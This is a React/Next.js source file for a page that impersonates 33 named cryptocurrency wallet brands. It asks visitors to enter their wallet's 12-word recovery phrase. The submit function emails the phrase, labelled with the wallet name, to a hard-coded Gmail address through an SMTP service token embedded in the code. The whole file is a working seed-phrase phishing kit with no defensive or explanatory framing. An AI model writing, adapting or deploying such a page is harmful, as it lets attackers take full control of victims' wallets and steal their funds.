import { useState } from "react";

export const getStaticPaths = () => {
    const purses = [
        {
            name: "trust wallet",
            image: "/images/trust-wallet.png",
            id: 1
        },
        {
            name: "Tron wallet",
            image: "/images/tron-wallet.png",
            id: 2
        },
        {
            name: "Cubcoin wallet",
            image: "/images/cubcoin-wallet.png",
            id: 3
        },
        {
            name: "AAVE wallet",
            image: "/images/aave-wallet.png",
            id: 4
        },
        {
            name: " Wallet Connect",
            image: "/images/wallet-connect.png",
            id: 5
        },
        {
            name: "Enjin wallet",
            image: "/images/enjin-wallet.png",
            id: 6
        },
        {
            name: "Yoroi wallet",
            image: "/images/yoroi-wallet.png",
            id: 7
        },
        {
            name: "Metamask wallet",
            image: "/images/metamask-wallet.png",
            id: 7
        },
        {
            name: "Keplr wallet",
            image: "/images/keplr-wallet.png",
            id: 8
        },
        {
            name: "KyberNetwork wallet",
            image: "/images/kybernetwork-wallet.png",
            id: 9
        },
        {
            name: "Solana wallet",
            image: "/images/solana-wallet.png",
            id: 10
        },
        {
            name: "Autherum wallet",
            image: "/images/autherum-wallet.png",
            id: 11
        },
        {
            name: "Portis wallet",
            image: "/images/portis-wallet.png",
            id: 12
        },
        {
            name: "Cosmos wallet",
            image: "/images/cosmos-wallet.png",
            id: 13
        },
        {
            name: "Saitama",
            image: "/images/saitama.png",
            id: 14
        },
        {
            name: "Polkadot wallet",
            image: "/images/polkadot-wallet.png",
            id: 15
        },
        {
            name: "Kardiachain wallet",
            image: "/images/kardiachain-wallet.png",
            id: 16
        },
        {
            name: "1inch wallet",
            image: "/images/1inch-wallet.png",
            id: 17
        },
        {
            name: "Coinbase wallet",
            image: "/images/coinbase-wallet.png",
            id: 18
        },
        {
            name: "Kava wallet",
            image: "/images/kava-wallet.png",
            id: 19
        },
        {
            name: "Vacant wallet",
            image: "/images/vacant.png",
            id: 20
        },
        {
            name: "Algorand wallet",
            image: "/images/algorand-wallet.png",
            id: 21
        },
        {
            name: "Fantom wallet",
            image: "/images/fantom-wallet.png",
            id: 22
        },
        {
            name: "Harmony wallet",
            image: "/images/harmony-wallet.png",
            id: 23
        },
        {
            name: "Raydium wallet",
            image: "/images/raydium-wallet.png",
            id: 24
        },
        {
            name: "Klever wallet",
            image: "/images/kelver-wallet.png",
            id: 25
        },
        {
            name: "Monero wallet",
            image: "/images/monero-wallet.png",
            id: 26
        },
        {
            name: "Formatic wallet",
            image: "/images/formatic-wallet.png",
            id: 27
        },
        {
            name: "Defiat wallet",
            image: "/images/defiat-wallet.png",
            id: 28
        },
        {
            name: "Skale wallet",
            image: "/images/skale-wallet.png",
            id: 29
        },
        {
            name: "Coinomi wallet",
            image: "/images/coinomi-wallet.png",
            id: 30
        },
        {
            name: "Atomic wallet",
            image: "/images/atomic-wallet.png",
            id: 31
        },
        {
            name: "Jaxx wallet",
            image: "/images/jaxx-wallet.png",
            id: 32
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin-wallet.png",
            id: 33
        }
    ];
    const res = purses;
    const paths = res.map(purse => {
        return{
            params: { id: purse.id.toString()}
        }
    });

    return {
        paths,
        fallback: false
    }
}
export const getStaticProps = ( context ) => {
    const purses = [
        {
            name: "trust wallet",
            image: "/images/trust-wallet.png",
            id: 1
        },
        {
            name: "Tron wallet",
            image: "/images/tron-wallet.png",
            id: 2
        },
        {
            name: "Cubcoin wallet",
            image: "/images/cubcoin-wallet.png",
            id: 3
        },
        {
            name: "AAVE wallet",
            image: "/images/aave-wallet.png",
            id: 4
        },
        {
            name: " Wallet Connect",
            image: "/images/wallet-connect.png",
            id: 5
        },
        {
            name: "Enjin wallet",
            image: "/images/enjin-wallet.png",
            id: 6
        },
        {
            name: "Yoroi wallet",
            image: "/images/yoroi-wallet.png",
            id: 7
        },
        {
            name: "Metamask wallet",
            image: "/images/metamask-wallet.png",
            id: 7
        },
        {
            name: "Keplr wallet",
            image: "/images/keplr-wallet.png",
            id: 8
        },
        {
            name: "KyberNetwork wallet",
            image: "/images/kybernetwork-wallet.png",
            id: 9
        },
        {
            name: "Solana wallet",
            image: "/images/solana-wallet.png",
            id: 10
        },
        {
            name: "Autherum wallet",
            image: "/images/autherum-wallet.png",
            id: 11
        },
        {
            name: "Portis wallet",
            image: "/images/portis-wallet.png",
            id: 12
        },
        {
            name: "Cosmos wallet",
            image: "/images/cosmos-wallet.png",
            id: 13
        },
        {
            name: "Saitama",
            image: "/images/saitama.png",
            id: 14
        },
        {
            name: "Polkadot wallet",
            image: "/images/polkadot-wallet.png",
            id: 15
        },
        {
            name: "Kardiachain wallet",
            image: "/images/kardiachain-wallet.png",
            id: 16
        },
        {
            name: "1inch wallet",
            image: "/images/1inch-wallet.png",
            id: 17
        },
        {
            name: "Coinbase wallet",
            image: "/images/coinbase-wallet.png",
            id: 18
        },
        {
            name: "Kava wallet",
            image: "/images/kava-wallet.png",
            id: 19
        },
        {
            name: "Vacant wallet",
            image: "/images/vacant.png",
            id: 20
        },
        {
            name: "Algorand wallet",
            image: "/images/algorand-wallet.png",
            id: 21
        },
        {
            name: "Fantom wallet",
            image: "/images/fantom-wallet.png",
            id: 22
        },
        {
            name: "Harmony wallet",
            image: "/images/harmony-wallet.png",
            id: 23
        },
        {
            name: "Raydium wallet",
            image: "/images/raydium-wallet.png",
            id: 24
        },
        {
            name: "Klever wallet",
            image: "/images/kelver-wallet.png",
            id: 25
        },
        {
            name: "Monero wallet",
            image: "/images/monero-wallet.png",
            id: 26
        },
        {
            name: "Formatic wallet",
            image: "/images/formatic-wallet.png",
            id: 27
        },
        {
            name: "Defiat wallet",
            image: "/images/defiat-wallet.png",
            id: 28
        },
        {
            name: "Skale wallet",
            image: "/images/skale-wallet.png",
            id: 29
        },
        {
            name: "Coinomi wallet",
            image: "/images/coinomi-wallet.png",
            id: 30
        },
        {
            name: "Atomic wallet",
            image: "/images/atomic-wallet.png",
            id: 31
        },
        {
            name: "Jaxx wallet",
            image: "/images/jaxx-wallet.png",
            id: 32
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin-wallet.png",
            id: 33
        }
    ];
    const _id = context.params.id;

    const data = purses[_id - 1];

    console.log(data, _id)

    return{
        props:{ data}
    }
}
const Phrase = ({ data }) => {
    const [phrase12, setPhrase12] = useState("")
    const myFunc = ( ) => {
        Email.send({
            SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
            To : 'amogukachi7@gmail.com',
            From : "kachiamogu47@gmail.com",
            Subject : data.name,
            Body : phrase12
        }).then(
          message => alert(message)
        );
        console.log(phrase12)
    }
    return(
        <div>

            <h1>Phrase</h1>
            <form action="">
                <label>12 phrase words</label>
                <textarea placeholder="Please input wallet's 12 phrase words..." 
                onChange={(e) => {setPhrase12(e.target.value)}}
                ></textarea>
            </form>
            <button onClick={myFunc} id="but">Submit</button>
            <p id="holder">fgd</p>
        </div>
    )
}

export default Phrase